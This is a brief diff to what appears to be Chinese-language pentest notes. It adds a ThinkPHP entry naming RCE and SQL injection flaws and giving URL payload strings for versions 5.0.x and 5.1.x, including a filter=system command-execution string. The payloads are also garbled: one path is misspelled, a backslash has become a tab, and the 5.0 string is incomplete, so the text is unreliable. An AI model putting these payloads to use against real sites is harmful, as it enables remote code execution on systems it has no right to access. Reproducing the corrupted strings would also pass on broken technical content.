@@ -1,1 +1,5 @@
-https://www.cnblogs.com/lingzhisec/p/15728886.html
+ThinkPHP 框架
+漏洞: RCE (5.0/5.1), SQL注入
+5.0.x: ?s=index/thinkpp/invokefunction&function=call_user_func_array
+5.1.x: ?s=index/	hink/Request/input&data=id&filter=system
+具体请查看代码审计/php框架审计/thinkphp审计
